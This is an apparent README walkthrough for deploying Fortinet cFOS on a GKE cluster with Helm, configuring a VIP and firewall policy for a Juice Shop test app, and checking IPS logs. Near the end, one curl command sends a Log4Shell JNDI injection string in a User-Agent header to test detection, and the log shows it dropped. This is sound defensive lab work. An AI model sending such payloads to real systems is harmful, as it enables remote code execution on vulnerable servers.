### deploy GKE 

```bash
./00_a_gcloud_env.sh
./00_create_network.sh
./01_gke.sh
```

### add label to worker node for deploy cFOS

```bash
kubectl get node
NAME                                                STATUS   ROLES    AGE    VERSION
gke-my-first-cluster-1-default-pool-63d106f1-xw2n   Ready    <none>   3m6s   v1.30.10-gke.1070000
kubectl label node gke-my-first-cluster-1-default-pool-63d106f1-xw2n security=true
node/gke-my-first-cluster-1-default-pool-63d106f1-xw2n labeled
kubectl get node -l security=true
NAME                                                STATUS   ROLES    AGE     VERSION
gke-my-first-cluster-1-default-pool-63d106f1-xw2n   Ready    <none>   3m33s   v1.30.10-gke.1070000
```

### get DNS ip address 
```bash
kubectl get svc kube-dns -n kube-system
NAME       TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)         AGE
kube-dns   ClusterIP   10.144.0.10   <none>        53/UDP,53/TCP   6m19s
```

### create cFOS license configmap file
download license file from support.fortinet.com 
```bash
./generatecfoslicensefromvmlicense.sh  CFOSVLTMxxxxxx.lic
cfos_license.yaml created.
```

### deploy license configmap file

```bash
kubectl apply -f cfos_license.yaml 
configmap/fos-license created
kubectl get cm fos-license
NAME               DATA   AGE
fos-license        1      5s
```

### deploy cFOS with helm 

```bash
helm repo add cfos-chart https://yagosys.github.io/cfos-chart
helm repo update
helm search repo cfos-chart
helm upgrade --install cfos7210250-deployment-new cfos-chart/cfos \
  --set routeManager.enabled=false \
  --set dnsConfig.nameserver=10.144.0.10 \
  --set-string nodeSelector.security="true" \
  --set appArmor.enabled=true 

```
output will be
```
helm upgrade --install cfos7210250-deployment-new cfos-chart/cfos \
>   --set routeManager.enabled=false \
>   --set dnsConfig.nameserver=10.144.0.10 \
>   --set-string nodeSelector.security="true" \
>   --set appArmor.enabled=true 
Release "cfos7210250-deployment-new" does not exist. Installing it now.
W0423 23:25:54.483733    7913 warnings.go:70] spec.template.metadata.annotations[container.apparmor.security.beta.kubernetes.io/cfos]: deprecated since v1.30; use the "appArmorProfile" field instead
NAME: cfos7210250-deployment-new
LAST DEPLOYED: Wed Apr 23 23:25:48 2025
NAMESPACE: default
STATUS: deployed
REVISION: 1
NOTES:
1. Get the application URL by running these commands:
  export POD_NAME=$(kubectl get pods --namespace default -l "app.kubernetes.io/name=cfos,app.kubernetes.io/instance=cfos7210250-deployment-new" -o jsonpath="{.items[0].metadata.name}")
  export CONTAINER_PORT=$(kubectl get pod --namespace default $POD_NAME -o jsonpath="{.spec.containers[0].ports[0].containerPort}")
  echo "Visit http://127.0.0.1:8080 to use your application"
  kubectl --namespace default port-forward $POD_NAME 8080:$CONTAINER_PORT
```


### check cfos log
```bash
kubectl logs -f po/cfos7210250-deployment-new-75ddb9dbf4-fjgv8
Defaulted container "cfos" out of: cfos, init-myservice (init)

System is starting...

Firmware version is 7.2.1.0255
Preparing environment...
Verifying license...
INFO: 2025/04/23 23:26:05 importing license...
INFO: 2025/04/23 23:26:05 license is imported successfuly!
WARNING: System is running in restricted mode due to lack of valid license!
Starting services...
System is ready.

2025-04-23_23:26:08.46821 ok: run: /etc/services/certd: (pid 130) 5s, normally down
2025-04-23_23:26:13.53837 INFO: 2025/04/23 23:26:13 received a new fos configmap
2025-04-23_23:26:13.53839 INFO: 2025/04/23 23:26:13 configmap name: fos-license, labels: map[app:fos category:license]
2025-04-23_23:26:13.53839 INFO: 2025/04/23 23:26:13 got a fos license
```

###
```bash

kubectl exec -it po/cfos7210250-deployment-new-75ddb9dbf4-fjgv8 -- /bin/cli
Defaulted container "cfos" out of: cfos, init-myservice (init)
User: admin
Password: 
cFOS # execute update-now 
....
cFOS # diagnose sys license

Status: Valid license
SN: CFOSVLTM24000025
Valid From: 2025-02-14
Valid To: 2025-06-21

```

### create sample application for protect 

```
k apply -f juiceshop_deployment.yaml
k rollout status deployment juiceshop -n security
```
#### write down clusterip address for jiuceshop-service, in this case it is 10.144.10.73
```
k get svc -n security
NAME                TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)    AGE
juiceshop-service   ClusterIP   10.144.10.73   <none>        3000/TCP   15m
```
### create vip config for cFOS to proxy for juiceshop

modify mappedip to your actual ip for juiceshop-service 
```bash
cat cfosconfigmapforjuiceshop.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: cfosconfigvipjuiceshop
  labels:
      app: fos
      category: config
data:
  type: partial
  config: |-
    config firewall vip
           edit juiceshop
            set extip "cfostest-headless.default.svc.cluster.local"
            set mappedip 10.144.10.73
            set extintf "eth0"
            set portforward enable
            set extport "3000"
            set mappedport "3000"
           next
       end
```

there is other way to config vip which use access-proxy instead static-nat 
this way does not require to config extip. so no need use headless svc for cfos.

```bash
apiVersion: v1
kind: ConfigMap
metadata:
  name: cfosconfigvipjuiceshop
  labels:
      app: fos
      category: config
data:
  type: partial
  config: |-
    config firewall vip
           edit juiceshop
            set type access-proxy
            set service "ALL"
            set mappedip 10.144.0.252
            set extintf "eth0"
            set portforward enable
            set extport "3000"
            set mappedport "3000"
           next
       end
```

then apply this yaml
```bash
k apply -f cfosconfigmapforjuiceshop.yaml
```

### create configmap firewall policy for cfos
```bash
k apply -f cfosconfigmapjuiceshopfirewallpolicyforvip.yaml
```

### check your cFOS config 
```bash
k exec -it po/cfos7210250-deployment-new-75ddb9dbf4-fjgv8 -- /bin/cli 
cFOS # show firewall vip
config firewall vip
    edit "juiceshop"

        set extip "cfostest-headless.default.svc.cluster.local"
        set mappedip "10.144.10.73"
        set extintf "eth0"
        set portforward enable
        set extport "3000"
        set mappedport "3000"
    next
end
cFOS # show firewall policy 
config firewall policy
    edit 10
        set utm-status enable
        set name "juiceshop"
        set srcintf "eth0"
        set dstintf "eth0"
        set srcaddr "all"
        set dstaddr "juiceshop"
        set av-profile "default"
        set webfilter-profile "default"
        set ips-sensor "default"
        set nat enable
        set logtraffic all
    next
end
```

### add label to your node for deploy application. 

```bash
kubectl label node gke-my-first-cluster-1-default-pool-63d106f1-xw2n app=true
```

### create clientpod 
this will create pod in namespace backend. we will send attack traffic from this pod 
```
k apply -f diag2_deployment.yaml
```
### check deployed clientpod 

```bash
k get pod -n backend
NAME                     READY   STATUS    RESTARTS   AGE
diag2-7f9768dc5d-vxbbz   1/1     Running   0          22m
```

### send test traffic from clientpod to juiceshop

```bash
kubectl exec -it diag2-7f9768dc5d-vxbbz --namespace backend -- bash -c "curl -s -I --max-time 5 http://juiceshop-service.security.svc.cluster.local:3000/"
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Thu, 24 Apr 2025 00:49:35 GMT
ETag: W/"138f5-19665458058"
Content-Type: text/html; charset=UTF-8
Content-Length: 80117
Vary: Accept-Encoding
Date: Thu, 24 Apr 2025 01:12:08 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

### send ips attack traffic from clientpod to juiceshop
```bash

kubectl exec -it diag2-7f9768dc5d-vxbbz --namespace backend -- bash -c 'curl -s -I --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}" cfostest-headless.default.svc.cluster.local:3000'

```

### check cFOS log 

```bash
kubectl exec -it po/cfos7210250-deployment-new-75ddb9dbf4-fjgv8 -c cfos -- tail -n -1 /var/log/log/ips.0
date=2025-04-24 time=00:56:41 eventtime=1745456201 tz="+0000" logid="0419016384" type="utm" subtype="ips" eventtype="signature" level="alert" severity="critical" srcip=10.140.0.16 dstip=10.144.10.73 srcintf="eth0" dstintf="eth0" sessionid=5 action="dropped" proto=6 service="HTTP" policyid=10 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" srcport=42194 dstport=3000 hostname="cfostest-headless.default.svc.cluster.local" url="/" direction="outgoing" attackid=51006 profile="default" incidentserialno=161480707 msg="apache: Apache.Log4j.Error.Log.Remote.Code.Execution"
```

### full demo with script
```
./cfosdemo.sh  demo
```

### delete cluster

```bash
gcloud container clusters delete my-first-cluster-1 --zone us-central1-a 
```
